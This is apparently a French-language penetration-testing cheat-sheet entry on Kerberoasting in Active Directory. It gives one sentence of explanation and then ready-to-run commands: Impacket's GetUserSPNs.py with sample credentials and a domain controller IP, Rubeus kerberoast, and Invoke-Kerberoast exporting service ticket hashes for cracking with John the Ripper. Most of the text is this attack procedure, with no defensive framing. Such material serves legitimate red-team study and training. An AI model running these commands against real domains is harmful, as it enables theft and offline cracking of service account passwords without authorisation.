Kerberoasting permet à un utilisateur de demander un ticket de service pour n'importe quel service avec un SPN enregistré, puis d'utiliser ce ticket pour déchiffrer le mot de passe du service. **Si le service a un SPN enregistré, il peut être Kerberoastable**

```sh
GetUserSPNs.py dom.local/user:password -dc-ip 192.168.75.152 -request
```

```c
Rubeus.exe kerberoast
```

```sh
Invoke-Kerberoast -domain dom.local | Export-CSV -NoTypeInformation output.csv
john --session=Kerberoasting output.csv
```